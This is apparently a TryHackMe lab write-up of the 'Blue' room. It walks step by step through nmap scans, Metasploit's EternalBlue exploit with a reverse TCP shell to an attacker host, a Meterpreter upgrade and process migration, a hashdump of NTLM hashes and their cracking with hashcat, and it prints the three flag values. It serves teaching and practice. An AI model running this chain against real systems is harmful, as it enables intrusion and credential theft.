# Blue – TryHackMe Writeup

## Overview

This report documents the compromise of the **Blue** TryHackMe machine through exploitation of the **MS17-010 (EternalBlue)** vulnerability, followed by post-exploitation activities including shell upgrade, process migration, credential dumping, password cracking, and flag retrieval.

The objective was to identify the vulnerable service, gain remote code execution, obtain SYSTEM privileges, and retrieve all available flags.

---

# Target Information

| Field | Value |
|---------|---------|
| Target IP | 10.49.135.224 |
| Platform | TryHackMe |
| Room Name | Blue |

---

# Executive Summary

During the assessment, a critical vulnerability was identified in the SMB service running on the target system.

The attack chain involved:

1. Enumerating exposed network services.
2. Identifying SMB service on port 445.
3. Discovering vulnerability to MS17-010 (EternalBlue).
4. Exploiting the target using Metasploit.
5. Obtaining a SYSTEM-level reverse shell.
6. Upgrading the shell to Meterpreter.
7. Migrating into a stable SYSTEM process.
8. Dumping local password hashes.
9. Cracking user credentials.
10. Retrieving all available flags.

---

# Methodology

The assessment followed a standard penetration testing methodology:

* Reconnaissance
* Enumeration
* Vulnerability Analysis
* Exploitation
* Post-Exploitation
* Credential Access
* Flag Discovery

---

# Phase 1 – Reconnaissance

## Host Discovery

### Command

```bash
ping 10.49.135.224
```

### Findings

The target responded to ICMP requests, confirming network connectivity.

### Observation

```text
TTL = 126
```

The TTL value suggested the target was likely running a Windows operating system.

---

# Phase 2 – Network Enumeration

## Initial Port Scan

### Command

```bash
nmap -p 1-999 10.49.135.224
```

### Results

| Port | Service |
|--------|--------|
| 135 | MSRPC |
| 139 | NetBIOS |
| 445 | SMB |

### Analysis

The exposed services indicated a Windows host with SMB file sharing enabled.

Since SMB has historically been a common attack vector, port 445 became the primary focus for further investigation.

---

## Service Enumeration

### Command

```bash
nmap -sV -p 1-999 10.49.135.224
```

### Results

```text
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

```text
Microsoft Windows 7 Professional 7601 Service Pack 1 x64
```

### Analysis

The service banner identified the target as Windows 7 SP1, a system known to be vulnerable to MS17-010 if not patched.

---

# Phase 3 – Vulnerability Analysis

## Identifying EternalBlue

Research into the SMB service and operating system version revealed a likely vulnerability:

```text
MS17-010 (EternalBlue)
```

### Description

MS17-010 is a critical vulnerability affecting SMBv1 that allows remote attackers to execute arbitrary code by sending specially crafted packets to port 445.

### Security Impact

Successful exploitation can result in unauthenticated remote code execution with SYSTEM privileges.

---

# Phase 4 – Exploitation

## Launching Metasploit

### Command

```bash
msfconsole
```

### Searching for EternalBlue

```bash
search ms17-010
```

### Result

```text
exploit/windows/smb/ms17_010_eternalblue
```

### Selecting the Exploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

## Configuring the Exploit

### Commands

```bash
set RHOSTS 10.49.135.224
set LHOST 192.168.130.28
set payload windows/x64/shell/reverse_tcp
```

### Why Use Reverse TCP?

The EternalBlue exploit provides code execution on the target, but a payload is still required to establish an interactive connection back to the attacker's machine.

The selected payload:

```text
windows/x64/shell/reverse_tcp
```

causes the victim machine to initiate a connection back to the attacker's listener, providing a remote shell after successful exploitation.

### Verification

The built-in vulnerability check confirmed the target was vulnerable.

```text
Host is likely VULNERABLE to MS17-010
```

---

## Executing the Exploit

### Command

```bash
run
```

### Result

```text
Command shell session opened
```

### Verification

```cmd
whoami
```

### Output

```text
nt authority\system
```

### Analysis

The EternalBlue exploit successfully achieved remote code execution and immediately provided a SYSTEM-level reverse shell.

---

# Phase 5 – Initial Flag Discovery

## Locating the First Flag

### Command

```cmd
dir C:\
```

### Result

```text
flag1.txt
```

---

## Reading the Flag

### Command

```cmd
type C:\flag1.txt
```

### Result

```text
flag{access_the_machine}
```

---

# Phase 6 – Shell Upgrade

## Finding Meterpreter Upgrade Module

### Command

```bash
search shell_to_meterpreter
```

### Result

```text
post/multi/manage/shell_to_meterpreter
```

---

## Configuring the Upgrade

### Commands

```bash
use post/multi/manage/shell_to_meterpreter

set SESSION 1
set LHOST 192.168.130.28
```

### Executing

```bash
run
```

### Result

```text
meterpreter session opened
```

---

## Interacting with Meterpreter

### Command

```bash
sessions -i 2
```

### Verification

```text
meterpreter >
```

### Analysis

Meterpreter provides significantly more post-exploitation functionality than a basic command shell, including:

* Process migration
* Credential dumping
* Token manipulation
* File transfer
* Privilege escalation modules

---

# Phase 7 – Credential Access

## Enumerating Processes

### Command

```bash
ps
```

### Observation

A stable SYSTEM process was identified:

```text
PID 644 - winlogon.exe
```

---

## Process Migration

### Command

```bash
migrate 644
```

### Result

```text
Migration completed successfully
```

### Why Migrate?

In this specific room, migration was not strictly required because the shell was already running as:

```text
NT AUTHORITY\SYSTEM
```

However, process migration is a common post-exploitation technique used to:

* Increase session stability
* Avoid losing access if the exploited process crashes
* Blend into legitimate system processes
* Inherit the privileges of the target process

If an attacker initially gains access through a low-privileged process, migrating into a SYSTEM process can often provide elevated privileges and more reliable persistence.

---

## Dumping Password Hashes

### Command

```bash
hashdump
```

### Result

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

### Analysis

The NTLM hash belonging to user **Jon** was successfully extracted from the SAM database.

---

# Phase 8 – Password Cracking

## Saving the Hash

### File

```text
hash.txt
```

### Contents

```text
ffb43f0de35be4d9917ac0cc8ad57f8d
```

---

## Cracking with Hashcat

### Command

```bash
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

### Result

```text
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22
```

### Recovered Credentials

| User | Password |
|--------|----------|
| Jon | alqfna22 |

### Analysis

The password was recovered using a dictionary attack against the extracted NTLM hash.

---

# Phase 9 – Second Flag Discovery

## Navigating to the Config Directory

### Commands

```cmd
cd C:\Windows\System32\config
dir
```

### Result

```text
flag2.txt
```

---

## Reading the Flag

### Command

```cmd
type flag2.txt
```

### Result

```text
flag{sam_database_elevated_access}
```

---

# Phase 10 – Third Flag Discovery

## Navigating to Jon's Documents

### Commands

```cmd
cd C:\Users\Jon\Documents
dir
```

### Result

```text
flag3.txt
```

---

## Reading the Flag

### Command

```cmd
type flag3.txt
```

### Result

```text
flag{admin_documents_can_be_valuable}
```

---

# Attack Chain

```text
SMB Enumeration
       ↓
Windows 7 SP1 Identified
       ↓
MS17-010 Vulnerability Detected
       ↓
EternalBlue Exploitation
       ↓
Reverse TCP Shell
       ↓
SYSTEM Access
       ↓
Shell Upgraded to Meterpreter
       ↓
Process Migration
       ↓
Hashdump
       ↓
NTLM Hash Extracted
       ↓
Hashcat Password Cracking
       ↓
Jon : alqfna22
       ↓
Flag Collection
```

---

# Findings & Vulnerabilities

| ID | Finding | Severity |
|----|----------|----------|
| F-01 | SMBv1 Enabled | Critical |
| F-02 | System Vulnerable to MS17-010 | Critical |
| F-03 | Unauthenticated Remote Code Execution | Critical |
| F-04 | SYSTEM-Level Access Achievable | Critical |
| F-05 | NTLM Hashes Accessible After Compromise | High |
| F-06 | Weak User Password | Medium |

---

# Tools Used

### Enumeration

* Nmap

### Exploitation

* Metasploit Framework
* EternalBlue (MS17-010)

### Post-Exploitation

* Meterpreter
* Hashdump
* Process Migration

### Password Cracking

* Hashcat
* RockYou Wordlist

---

# Flags Obtained

| Flag | Value |
|---------|---------|
| Flag 1 | flag{access_the_machine} |
| Flag 2 | flag{sam_database_elevated_access} |
| Flag 3 | flag{admin_documents_can_be_valuable} |

---

# Conclusion

The compromise of the Blue machine was achieved through exploitation of the critical **MS17-010 (EternalBlue)** vulnerability affecting SMBv1 on Windows 7 SP1.

After identifying the vulnerable SMB service, the EternalBlue exploit was combined with a **reverse TCP payload** to obtain a remote SYSTEM shell. The shell was then upgraded to Meterpreter to enable advanced post-exploitation activities. Process migration was performed to move into a stable SYSTEM process, a common technique used to improve session reliability and privilege inheritance.

Following successful compromise, password hashes were extracted from the system and cracked using Hashcat, revealing valid user credentials. Access to the entire system enabled retrieval of all challenge flags.

This assessment demonstrates the severe risk posed by unpatched SMB services and highlights the importance of disabling SMBv1, applying security updates promptly, and enforcing strong password policies.